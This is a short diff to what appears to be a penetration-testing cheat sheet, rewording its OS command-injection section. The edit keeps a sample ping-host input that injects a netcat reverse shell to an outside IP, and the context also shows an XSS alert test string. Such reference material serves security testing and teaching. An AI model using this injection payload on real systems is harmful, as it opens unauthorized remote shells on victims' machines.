@@ -293,9 +293,9 @@ XSS attempts:
 ```<script>alert(‘test’);</script>```
 
 # OS Command Injection
-Exploiting web interface ping.php to make OS Calls:
-
-PING HOST: ```127.0.0.1& nc 10.10.10.1 443 -e /bin/bash```
+Abuse web interfaces that are clearly making system calls
+e.g., Exploiting a web interface ```ping.php``` to make OS Calls:
+**PING HOST:\>** ```127.0.0.1& nc 10.10.10.1 443 -e /bin/bash```
 
 Shell Meta-Character Examples:
 #### Windows and Unix
